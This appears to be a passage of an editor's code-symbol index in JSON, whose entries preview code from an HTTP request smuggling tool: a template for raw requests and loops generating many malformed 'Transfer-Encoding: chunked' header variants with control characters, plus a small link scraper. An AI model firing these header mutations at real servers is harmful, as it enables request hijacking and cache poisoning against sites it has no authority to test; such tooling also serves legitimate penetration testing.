        "peekOfCode": "resp = requests.get(site, verify=False, headers=header)\nif resp.status_code == 200:\n    content = resp.content\n    links = re.findall('(?:href=\")(.*?)\"', content.decode('utf-8'))\n    duplicatelinks = set(links)\n    for link in links:\n        link = urljoin(site, link)\n        if link not in duplicatelinks:\n            print(f\"{link} \\n\")",
        "detail": "scripts.waybackmachina",
        "documentation": {}
    },
    {
        "label": "render_template",
        "kind": 2,
        "importPath": "tools.smuggler.configs.default",
        "description": "tools.smuggler.configs.default",
        "peekOfCode": "def render_template(gadget):\n\tRN = \"\\r\\n\"\n\tp = Payload()\n\tp.header  = \"__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1\" + RN\n\t# p.header += \"Transfer-Encoding: chunked\" +RN\t\n\tp.header += gadget + RN\n\tp.header += \"Host: __HOST__\" + RN\n\tp.header += \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36\" + RN\n\tp.header += \"Content-type: application/x-www-form-urlencoded; charset=UTF-8\" + RN\n\tp.header += \"Content-Length: __REPLACE_CL__\" + RN",
        "detail": "tools.smuggler.configs.default",
        "documentation": {}
    },
    {
        "label": "\tRN",
        "kind": 5,
        "importPath": "tools.smuggler.configs.default",
        "description": "tools.smuggler.configs.default",
        "peekOfCode": "\tRN = \"\\r\\n\"\n\tp = Payload()\n\tp.header  = \"__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1\" + RN\n\t# p.header += \"Transfer-Encoding: chunked\" +RN\t\n\tp.header += gadget + RN\n\tp.header += \"Host: __HOST__\" + RN\n\tp.header += \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36\" + RN\n\tp.header += \"Content-type: application/x-www-form-urlencoded; charset=UTF-8\" + RN\n\tp.header += \"Content-Length: __REPLACE_CL__\" + RN\n\treturn p",
        "detail": "tools.smuggler.configs.default",
        "documentation": {}
    },
    {
        "label": "\tp",
        "kind": 5,
        "importPath": "tools.smuggler.configs.default",
        "description": "tools.smuggler.configs.default",
        "peekOfCode": "\tp = Payload()\n\tp.header  = \"__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1\" + RN\n\t# p.header += \"Transfer-Encoding: chunked\" +RN\t\n\tp.header += gadget + RN\n\tp.header += \"Host: __HOST__\" + RN\n\tp.header += \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36\" + RN\n\tp.header += \"Content-type: application/x-www-form-urlencoded; charset=UTF-8\" + RN\n\tp.header += \"Content-Length: __REPLACE_CL__\" + RN\n\treturn p\nmutations[\"nameprefix1\"] = render_template(\" Transfer-Encoding: chunked\")",
        "detail": "tools.smuggler.configs.default",
        "documentation": {}
    },
    {
        "label": "mutations[\"nameprefix1\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.default",
        "description": "tools.smuggler.configs.default",
        "peekOfCode": "mutations[\"nameprefix1\"] = render_template(\" Transfer-Encoding: chunked\")\nmutations[\"tabprefix1\"] = render_template(\"Transfer-Encoding:\\tchunked\")\nmutations[\"tabprefix2\"] = render_template(\"Transfer-Encoding\\t:\\tchunked\")\nmutations[\"space1\"] = render_template(\"Transfer-Encoding : chunked\")\nfor i in [0x1,0x4,0x8,0x9,0xa,0xb,0xc,0xd,0x1F,0x20,0x7f,0xA0,0xFF]:\n\tmutations[\"midspace-%02x\"%i] = render_template(\"Transfer-Encoding:%cchunked\"%(i))\n\tmutations[\"postspace-%02x\"%i] = render_template(\"Transfer-Encoding%c: chunked\"%(i))\n\tmutations[\"prespace-%02x\"%i] = render_template(\"%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspace-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\"%(i))\n\tmutations[\"xprespace-%02x\"%i] = render_template(\"X: X%cTransfer-Encoding: chunked\"%(i))",
        "detail": "tools.smuggler.configs.default",
        "documentation": {}
    },
    {
        "label": "mutations[\"tabprefix1\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.default",
        "description": "tools.smuggler.configs.default",
        "peekOfCode": "mutations[\"tabprefix1\"] = render_template(\"Transfer-Encoding:\\tchunked\")\nmutations[\"tabprefix2\"] = render_template(\"Transfer-Encoding\\t:\\tchunked\")\nmutations[\"space1\"] = render_template(\"Transfer-Encoding : chunked\")\nfor i in [0x1,0x4,0x8,0x9,0xa,0xb,0xc,0xd,0x1F,0x20,0x7f,0xA0,0xFF]:\n\tmutations[\"midspace-%02x\"%i] = render_template(\"Transfer-Encoding:%cchunked\"%(i))\n\tmutations[\"postspace-%02x\"%i] = render_template(\"Transfer-Encoding%c: chunked\"%(i))\n\tmutations[\"prespace-%02x\"%i] = render_template(\"%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspace-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\"%(i))\n\tmutations[\"xprespace-%02x\"%i] = render_template(\"X: X%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspacex-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%cX: X\"%(i))",
        "detail": "tools.smuggler.configs.default",
        "documentation": {}
    },
    {
        "label": "mutations[\"tabprefix2\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.default",
        "description": "tools.smuggler.configs.default",
        "peekOfCode": "mutations[\"tabprefix2\"] = render_template(\"Transfer-Encoding\\t:\\tchunked\")\nmutations[\"space1\"] = render_template(\"Transfer-Encoding : chunked\")\nfor i in [0x1,0x4,0x8,0x9,0xa,0xb,0xc,0xd,0x1F,0x20,0x7f,0xA0,0xFF]:\n\tmutations[\"midspace-%02x\"%i] = render_template(\"Transfer-Encoding:%cchunked\"%(i))\n\tmutations[\"postspace-%02x\"%i] = render_template(\"Transfer-Encoding%c: chunked\"%(i))\n\tmutations[\"prespace-%02x\"%i] = render_template(\"%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspace-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\"%(i))\n\tmutations[\"xprespace-%02x\"%i] = render_template(\"X: X%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspacex-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%cX: X\"%(i))\n\tmutations[\"rxprespace-%02x\"%i] = render_template(\"X: X\\r%cTransfer-Encoding: chunked\"%(i))",
        "detail": "tools.smuggler.configs.default",
        "documentation": {}
    },
    {
        "label": "mutations[\"space1\"]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.default",
        "description": "tools.smuggler.configs.default",
        "peekOfCode": "mutations[\"space1\"] = render_template(\"Transfer-Encoding : chunked\")\nfor i in [0x1,0x4,0x8,0x9,0xa,0xb,0xc,0xd,0x1F,0x20,0x7f,0xA0,0xFF]:\n\tmutations[\"midspace-%02x\"%i] = render_template(\"Transfer-Encoding:%cchunked\"%(i))\n\tmutations[\"postspace-%02x\"%i] = render_template(\"Transfer-Encoding%c: chunked\"%(i))\n\tmutations[\"prespace-%02x\"%i] = render_template(\"%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspace-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\"%(i))\n\tmutations[\"xprespace-%02x\"%i] = render_template(\"X: X%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspacex-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%cX: X\"%(i))\n\tmutations[\"rxprespace-%02x\"%i] = render_template(\"X: X\\r%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"xnprespace-%02x\"%i] = render_template(\"X: X%c\\nTransfer-Encoding: chunked\"%(i))",
        "detail": "tools.smuggler.configs.default",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"midspace-%02x\"%i]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.default",
        "description": "tools.smuggler.configs.default",
        "peekOfCode": "\tmutations[\"midspace-%02x\"%i] = render_template(\"Transfer-Encoding:%cchunked\"%(i))\n\tmutations[\"postspace-%02x\"%i] = render_template(\"Transfer-Encoding%c: chunked\"%(i))\n\tmutations[\"prespace-%02x\"%i] = render_template(\"%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspace-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\"%(i))\n\tmutations[\"xprespace-%02x\"%i] = render_template(\"X: X%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspacex-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%cX: X\"%(i))\n\tmutations[\"rxprespace-%02x\"%i] = render_template(\"X: X\\r%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"xnprespace-%02x\"%i] = render_template(\"X: X%c\\nTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspacerx-%02x\"%i] = render_template(\"Transfer-Encoding: chunked\\r%cX: X\"%(i))\n\tmutations[\"endspacexn-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\\nX: X\"%(i))",
        "detail": "tools.smuggler.configs.default",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"postspace-%02x\"%i]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.default",
        "description": "tools.smuggler.configs.default",
        "peekOfCode": "\tmutations[\"postspace-%02x\"%i] = render_template(\"Transfer-Encoding%c: chunked\"%(i))\n\tmutations[\"prespace-%02x\"%i] = render_template(\"%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspace-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\"%(i))\n\tmutations[\"xprespace-%02x\"%i] = render_template(\"X: X%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspacex-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%cX: X\"%(i))\n\tmutations[\"rxprespace-%02x\"%i] = render_template(\"X: X\\r%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"xnprespace-%02x\"%i] = render_template(\"X: X%c\\nTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspacerx-%02x\"%i] = render_template(\"Transfer-Encoding: chunked\\r%cX: X\"%(i))\n\tmutations[\"endspacexn-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\\nX: X\"%(i))",
        "detail": "tools.smuggler.configs.default",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"prespace-%02x\"%i]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.default",
        "description": "tools.smuggler.configs.default",
        "peekOfCode": "\tmutations[\"prespace-%02x\"%i] = render_template(\"%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspace-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\"%(i))\n\tmutations[\"xprespace-%02x\"%i] = render_template(\"X: X%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspacex-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%cX: X\"%(i))\n\tmutations[\"rxprespace-%02x\"%i] = render_template(\"X: X\\r%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"xnprespace-%02x\"%i] = render_template(\"X: X%c\\nTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspacerx-%02x\"%i] = render_template(\"Transfer-Encoding: chunked\\r%cX: X\"%(i))\n\tmutations[\"endspacexn-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\\nX: X\"%(i))",
        "detail": "tools.smuggler.configs.default",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"endspace-%02x\"%i]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.default",
        "description": "tools.smuggler.configs.default",
        "peekOfCode": "\tmutations[\"endspace-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\"%(i))\n\tmutations[\"xprespace-%02x\"%i] = render_template(\"X: X%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspacex-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%cX: X\"%(i))\n\tmutations[\"rxprespace-%02x\"%i] = render_template(\"X: X\\r%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"xnprespace-%02x\"%i] = render_template(\"X: X%c\\nTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspacerx-%02x\"%i] = render_template(\"Transfer-Encoding: chunked\\r%cX: X\"%(i))\n\tmutations[\"endspacexn-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\\nX: X\"%(i))",
        "detail": "tools.smuggler.configs.default",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"xprespace-%02x\"%i]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.default",
        "description": "tools.smuggler.configs.default",
        "peekOfCode": "\tmutations[\"xprespace-%02x\"%i] = render_template(\"X: X%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspacex-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%cX: X\"%(i))\n\tmutations[\"rxprespace-%02x\"%i] = render_template(\"X: X\\r%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"xnprespace-%02x\"%i] = render_template(\"X: X%c\\nTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspacerx-%02x\"%i] = render_template(\"Transfer-Encoding: chunked\\r%cX: X\"%(i))\n\tmutations[\"endspacexn-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\\nX: X\"%(i))",
        "detail": "tools.smuggler.configs.default",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"endspacex-%02x\"%i]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.default",
        "description": "tools.smuggler.configs.default",
        "peekOfCode": "\tmutations[\"endspacex-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%cX: X\"%(i))\n\tmutations[\"rxprespace-%02x\"%i] = render_template(\"X: X\\r%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"xnprespace-%02x\"%i] = render_template(\"X: X%c\\nTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspacerx-%02x\"%i] = render_template(\"Transfer-Encoding: chunked\\r%cX: X\"%(i))\n\tmutations[\"endspacexn-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\\nX: X\"%(i))",
        "detail": "tools.smuggler.configs.default",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"rxprespace-%02x\"%i]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.default",
        "description": "tools.smuggler.configs.default",
        "peekOfCode": "\tmutations[\"rxprespace-%02x\"%i] = render_template(\"X: X\\r%cTransfer-Encoding: chunked\"%(i))\n\tmutations[\"xnprespace-%02x\"%i] = render_template(\"X: X%c\\nTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspacerx-%02x\"%i] = render_template(\"Transfer-Encoding: chunked\\r%cX: X\"%(i))\n\tmutations[\"endspacexn-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\\nX: X\"%(i))",
        "detail": "tools.smuggler.configs.default",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"xnprespace-%02x\"%i]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.default",
        "description": "tools.smuggler.configs.default",
        "peekOfCode": "\tmutations[\"xnprespace-%02x\"%i] = render_template(\"X: X%c\\nTransfer-Encoding: chunked\"%(i))\n\tmutations[\"endspacerx-%02x\"%i] = render_template(\"Transfer-Encoding: chunked\\r%cX: X\"%(i))\n\tmutations[\"endspacexn-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\\nX: X\"%(i))",
        "detail": "tools.smuggler.configs.default",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"endspacerx-%02x\"%i]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.default",
        "description": "tools.smuggler.configs.default",
        "peekOfCode": "\tmutations[\"endspacerx-%02x\"%i] = render_template(\"Transfer-Encoding: chunked\\r%cX: X\"%(i))\n\tmutations[\"endspacexn-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\\nX: X\"%(i))",
        "detail": "tools.smuggler.configs.default",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"endspacexn-%02x\"%i]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.default",
        "description": "tools.smuggler.configs.default",
        "peekOfCode": "\tmutations[\"endspacexn-%02x\"%i] = render_template(\"Transfer-Encoding: chunked%c\\nX: X\"%(i))",
        "detail": "tools.smuggler.configs.default",
        "documentation": {}
    },
    {
        "label": "render_template",
        "kind": 2,
        "importPath": "tools.smuggler.configs.doubles",
        "description": "tools.smuggler.configs.doubles",
        "peekOfCode": "def render_template(gadget):\n\tRN = \"\\r\\n\"\n\tp = Payload()\n\tp.header  = \"__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1\" + RN\n\tp.header += gadget + RN\n\tp.header += \"Host: __HOST__\" + RN\n\tp.header += \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36\" + RN\n\tp.header += \"Content-type: application/x-www-form-urlencoded; charset=UTF-8\" + RN\n\tp.header += \"Content-Length: __REPLACE_CL__\" + RN\n\treturn p",
        "detail": "tools.smuggler.configs.doubles",
        "documentation": {}
    },
    {
        "label": "\tRN",
        "kind": 5,
        "importPath": "tools.smuggler.configs.doubles",
        "description": "tools.smuggler.configs.doubles",
        "peekOfCode": "\tRN = \"\\r\\n\"\n\tp = Payload()\n\tp.header  = \"__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1\" + RN\n\tp.header += gadget + RN\n\tp.header += \"Host: __HOST__\" + RN\n\tp.header += \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36\" + RN\n\tp.header += \"Content-type: application/x-www-form-urlencoded; charset=UTF-8\" + RN\n\tp.header += \"Content-Length: __REPLACE_CL__\" + RN\n\treturn p\nfor i in range(0x1,0x21):",
        "detail": "tools.smuggler.configs.doubles",
        "documentation": {}
    },
    {
        "label": "\tp",
        "kind": 5,
        "importPath": "tools.smuggler.configs.doubles",
        "description": "tools.smuggler.configs.doubles",
        "peekOfCode": "\tp = Payload()\n\tp.header  = \"__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1\" + RN\n\tp.header += gadget + RN\n\tp.header += \"Host: __HOST__\" + RN\n\tp.header += \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36\" + RN\n\tp.header += \"Content-type: application/x-www-form-urlencoded; charset=UTF-8\" + RN\n\tp.header += \"Content-Length: __REPLACE_CL__\" + RN\n\treturn p\nfor i in range(0x1,0x21):\n\tmutations[\"%02x-%02x-XX-XX\"%(i,i)] = render_template(\"%cTransfer-Encoding%c: chunked\"%(i,i))",
        "detail": "tools.smuggler.configs.doubles",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"%02x-%02x-XX-XX\"%(i,i)]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.doubles",
        "description": "tools.smuggler.configs.doubles",
        "peekOfCode": "\tmutations[\"%02x-%02x-XX-XX\"%(i,i)] = render_template(\"%cTransfer-Encoding%c: chunked\"%(i,i))\n\tmutations[\"%02x-XX-%02x-XX\"%(i,i)] = render_template(\"%cTransfer-Encoding:%cchunked\"%(i,i))\n\tmutations[\"%02x-XX-XX-%02x\"%(i,i)] = render_template(\"%cTransfer-Encoding: chunked%c\"%(i,i))\n\tmutations[\"XX-%02x-%02x-XX\"%(i,i)] = render_template(\"Transfer-Encoding%c:%cchunked\"%(i,i))\n\tmutations[\"XX-%02x-XX-%02x\"%(i,i)] = render_template(\"Transfer-Encoding%c: chunked%c\"%(i,i))\n\tmutations[\"XX-XX-%02x-%02x\"%(i,i)] = render_template(\"Transfer-Encoding:%cchunked%c\"%(i,i))\nfor i in range(0x7F,0x100):\n\tmutations[\"%02x-%02x-XX-XX\"%(i,i)] = render_template(\"%cTransfer-Encoding%c: chunked\"%(i,i))\n\tmutations[\"%02x-XX-%02x-XX\"%(i,i)] = render_template(\"%cTransfer-Encoding:%cchunked\"%(i,i))\n\tmutations[\"%02x-XX-XX-%02x\"%(i,i)] = render_template(\"%cTransfer-Encoding: chunked%c\"%(i,i))",
        "detail": "tools.smuggler.configs.doubles",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"%02x-XX-%02x-XX\"%(i,i)]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.doubles",
        "description": "tools.smuggler.configs.doubles",
        "peekOfCode": "\tmutations[\"%02x-XX-%02x-XX\"%(i,i)] = render_template(\"%cTransfer-Encoding:%cchunked\"%(i,i))\n\tmutations[\"%02x-XX-XX-%02x\"%(i,i)] = render_template(\"%cTransfer-Encoding: chunked%c\"%(i,i))\n\tmutations[\"XX-%02x-%02x-XX\"%(i,i)] = render_template(\"Transfer-Encoding%c:%cchunked\"%(i,i))\n\tmutations[\"XX-%02x-XX-%02x\"%(i,i)] = render_template(\"Transfer-Encoding%c: chunked%c\"%(i,i))\n\tmutations[\"XX-XX-%02x-%02x\"%(i,i)] = render_template(\"Transfer-Encoding:%cchunked%c\"%(i,i))\nfor i in range(0x7F,0x100):\n\tmutations[\"%02x-%02x-XX-XX\"%(i,i)] = render_template(\"%cTransfer-Encoding%c: chunked\"%(i,i))\n\tmutations[\"%02x-XX-%02x-XX\"%(i,i)] = render_template(\"%cTransfer-Encoding:%cchunked\"%(i,i))\n\tmutations[\"%02x-XX-XX-%02x\"%(i,i)] = render_template(\"%cTransfer-Encoding: chunked%c\"%(i,i))\n\tmutations[\"XX-%02x-%02x-XX\"%(i,i)] = render_template(\"Transfer-Encoding%c:%cchunked\"%(i,i))",
        "detail": "tools.smuggler.configs.doubles",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"%02x-XX-XX-%02x\"%(i,i)]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.doubles",
        "description": "tools.smuggler.configs.doubles",
        "peekOfCode": "\tmutations[\"%02x-XX-XX-%02x\"%(i,i)] = render_template(\"%cTransfer-Encoding: chunked%c\"%(i,i))\n\tmutations[\"XX-%02x-%02x-XX\"%(i,i)] = render_template(\"Transfer-Encoding%c:%cchunked\"%(i,i))\n\tmutations[\"XX-%02x-XX-%02x\"%(i,i)] = render_template(\"Transfer-Encoding%c: chunked%c\"%(i,i))\n\tmutations[\"XX-XX-%02x-%02x\"%(i,i)] = render_template(\"Transfer-Encoding:%cchunked%c\"%(i,i))\nfor i in range(0x7F,0x100):\n\tmutations[\"%02x-%02x-XX-XX\"%(i,i)] = render_template(\"%cTransfer-Encoding%c: chunked\"%(i,i))\n\tmutations[\"%02x-XX-%02x-XX\"%(i,i)] = render_template(\"%cTransfer-Encoding:%cchunked\"%(i,i))\n\tmutations[\"%02x-XX-XX-%02x\"%(i,i)] = render_template(\"%cTransfer-Encoding: chunked%c\"%(i,i))\n\tmutations[\"XX-%02x-%02x-XX\"%(i,i)] = render_template(\"Transfer-Encoding%c:%cchunked\"%(i,i))\n\tmutations[\"XX-%02x-XX-%02x\"%(i,i)] = render_template(\"Transfer-Encoding%c: chunked%c\"%(i,i))",
        "detail": "tools.smuggler.configs.doubles",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"XX-%02x-%02x-XX\"%(i,i)]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.doubles",
        "description": "tools.smuggler.configs.doubles",
        "peekOfCode": "\tmutations[\"XX-%02x-%02x-XX\"%(i,i)] = render_template(\"Transfer-Encoding%c:%cchunked\"%(i,i))\n\tmutations[\"XX-%02x-XX-%02x\"%(i,i)] = render_template(\"Transfer-Encoding%c: chunked%c\"%(i,i))\n\tmutations[\"XX-XX-%02x-%02x\"%(i,i)] = render_template(\"Transfer-Encoding:%cchunked%c\"%(i,i))\nfor i in range(0x7F,0x100):\n\tmutations[\"%02x-%02x-XX-XX\"%(i,i)] = render_template(\"%cTransfer-Encoding%c: chunked\"%(i,i))\n\tmutations[\"%02x-XX-%02x-XX\"%(i,i)] = render_template(\"%cTransfer-Encoding:%cchunked\"%(i,i))\n\tmutations[\"%02x-XX-XX-%02x\"%(i,i)] = render_template(\"%cTransfer-Encoding: chunked%c\"%(i,i))\n\tmutations[\"XX-%02x-%02x-XX\"%(i,i)] = render_template(\"Transfer-Encoding%c:%cchunked\"%(i,i))\n\tmutations[\"XX-%02x-XX-%02x\"%(i,i)] = render_template(\"Transfer-Encoding%c: chunked%c\"%(i,i))\n\tmutations[\"XX-XX-%02x-%02x\"%(i,i)] = render_template(\"Transfer-Encoding:%cchunked%c\"%(i,i))",
        "detail": "tools.smuggler.configs.doubles",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"XX-%02x-XX-%02x\"%(i,i)]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.doubles",
        "description": "tools.smuggler.configs.doubles",
        "peekOfCode": "\tmutations[\"XX-%02x-XX-%02x\"%(i,i)] = render_template(\"Transfer-Encoding%c: chunked%c\"%(i,i))\n\tmutations[\"XX-XX-%02x-%02x\"%(i,i)] = render_template(\"Transfer-Encoding:%cchunked%c\"%(i,i))\nfor i in range(0x7F,0x100):\n\tmutations[\"%02x-%02x-XX-XX\"%(i,i)] = render_template(\"%cTransfer-Encoding%c: chunked\"%(i,i))\n\tmutations[\"%02x-XX-%02x-XX\"%(i,i)] = render_template(\"%cTransfer-Encoding:%cchunked\"%(i,i))\n\tmutations[\"%02x-XX-XX-%02x\"%(i,i)] = render_template(\"%cTransfer-Encoding: chunked%c\"%(i,i))\n\tmutations[\"XX-%02x-%02x-XX\"%(i,i)] = render_template(\"Transfer-Encoding%c:%cchunked\"%(i,i))\n\tmutations[\"XX-%02x-XX-%02x\"%(i,i)] = render_template(\"Transfer-Encoding%c: chunked%c\"%(i,i))\n\tmutations[\"XX-XX-%02x-%02x\"%(i,i)] = render_template(\"Transfer-Encoding:%cchunked%c\"%(i,i))",
        "detail": "tools.smuggler.configs.doubles",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"XX-XX-%02x-%02x\"%(i,i)]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.doubles",
        "description": "tools.smuggler.configs.doubles",
        "peekOfCode": "\tmutations[\"XX-XX-%02x-%02x\"%(i,i)] = render_template(\"Transfer-Encoding:%cchunked%c\"%(i,i))\nfor i in range(0x7F,0x100):\n\tmutations[\"%02x-%02x-XX-XX\"%(i,i)] = render_template(\"%cTransfer-Encoding%c: chunked\"%(i,i))\n\tmutations[\"%02x-XX-%02x-XX\"%(i,i)] = render_template(\"%cTransfer-Encoding:%cchunked\"%(i,i))\n\tmutations[\"%02x-XX-XX-%02x\"%(i,i)] = render_template(\"%cTransfer-Encoding: chunked%c\"%(i,i))\n\tmutations[\"XX-%02x-%02x-XX\"%(i,i)] = render_template(\"Transfer-Encoding%c:%cchunked\"%(i,i))\n\tmutations[\"XX-%02x-XX-%02x\"%(i,i)] = render_template(\"Transfer-Encoding%c: chunked%c\"%(i,i))\n\tmutations[\"XX-XX-%02x-%02x\"%(i,i)] = render_template(\"Transfer-Encoding:%cchunked%c\"%(i,i))",
        "detail": "tools.smuggler.configs.doubles",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"%02x-%02x-XX-XX\"%(i,i)]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.doubles",
        "description": "tools.smuggler.configs.doubles",
        "peekOfCode": "\tmutations[\"%02x-%02x-XX-XX\"%(i,i)] = render_template(\"%cTransfer-Encoding%c: chunked\"%(i,i))\n\tmutations[\"%02x-XX-%02x-XX\"%(i,i)] = render_template(\"%cTransfer-Encoding:%cchunked\"%(i,i))\n\tmutations[\"%02x-XX-XX-%02x\"%(i,i)] = render_template(\"%cTransfer-Encoding: chunked%c\"%(i,i))\n\tmutations[\"XX-%02x-%02x-XX\"%(i,i)] = render_template(\"Transfer-Encoding%c:%cchunked\"%(i,i))\n\tmutations[\"XX-%02x-XX-%02x\"%(i,i)] = render_template(\"Transfer-Encoding%c: chunked%c\"%(i,i))\n\tmutations[\"XX-XX-%02x-%02x\"%(i,i)] = render_template(\"Transfer-Encoding:%cchunked%c\"%(i,i))",
        "detail": "tools.smuggler.configs.doubles",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"%02x-XX-%02x-XX\"%(i,i)]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.doubles",
        "description": "tools.smuggler.configs.doubles",
        "peekOfCode": "\tmutations[\"%02x-XX-%02x-XX\"%(i,i)] = render_template(\"%cTransfer-Encoding:%cchunked\"%(i,i))\n\tmutations[\"%02x-XX-XX-%02x\"%(i,i)] = render_template(\"%cTransfer-Encoding: chunked%c\"%(i,i))\n\tmutations[\"XX-%02x-%02x-XX\"%(i,i)] = render_template(\"Transfer-Encoding%c:%cchunked\"%(i,i))\n\tmutations[\"XX-%02x-XX-%02x\"%(i,i)] = render_template(\"Transfer-Encoding%c: chunked%c\"%(i,i))\n\tmutations[\"XX-XX-%02x-%02x\"%(i,i)] = render_template(\"Transfer-Encoding:%cchunked%c\"%(i,i))",
        "detail": "tools.smuggler.configs.doubles",
        "documentation": {}
    },
    {
        "label": "\tmutations[\"%02x-XX-XX-%02x\"%(i,i)]",
        "kind": 5,
        "importPath": "tools.smuggler.configs.doubles",
        "description": "tools.smuggler.configs.doubles",
